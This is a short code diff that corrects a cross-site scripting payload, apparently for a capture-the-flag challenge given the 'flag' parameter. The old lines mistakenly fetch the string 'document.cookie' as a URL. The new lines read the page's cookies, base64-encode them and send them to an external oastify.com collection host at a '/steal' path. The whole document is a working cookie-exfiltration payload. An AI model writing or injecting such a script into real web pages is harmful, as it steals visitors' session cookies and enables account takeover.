@@ -1,5 +1,4 @@
 <script>
-  fetch("document.cookie").then(r => r.text()).then(t => {
-    fetch("https://4w1ap45muaa6uvaslj7t0563cuil6cu1.oastify.com/steal?flag=" + btoa(t))
-  });
+  const cookie = document.cookie;
+  fetch("https://4w1ap45muaa6uvaslj7t0563cuil6cu1.oastify.com/steal?flag=" + btoa(cookie));
 </script>
